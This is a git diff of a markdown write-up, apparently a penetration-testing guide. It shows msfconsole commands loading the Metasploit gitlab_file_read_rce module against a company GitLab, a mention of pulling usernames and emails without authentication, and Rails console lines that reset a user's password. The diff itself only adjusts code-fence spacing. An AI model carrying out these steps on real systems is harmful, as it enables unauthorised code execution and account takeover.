@@ -54,7 +54,7 @@ This picture in Company Gitlab CI says a lot:)
 
 Now i can that i exploitetion RCE using msfconsole tool `https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce` because exploit was development and added it to exploit list. 
 
-```msf6 exploit(multi/http/gitlab_file_read_rce) > use exploit/multi/http/gitlab_file_read_rce
+``` msf6 exploit(multi/http/gitlab_file_read_rce) > use exploit/multi/http/gitlab_file_read_rce
 msf6 exploit(multi/http/gitlab_file_read_rce) > show options 
 
 Module options (exploit/multi/http/gitlab_file_read_rce):
@@ -157,7 +157,7 @@ Other type get username and email without Gitlab authentification is use api `ht
 
 Now you can change your password:
 
-```user.password = 'secret_pass'
+``` user.password = 'secret_pass'
  user.password_confirmation = 'secret_pass'
 ```
 
@@ -165,7 +165,7 @@ It’s important that you change both password and password_confirmation to make
 
 Don’t forget to save the changes.
 
-```user.save!
+``` user.save!
 ```
 Exit the console and try to login with your new password.
 
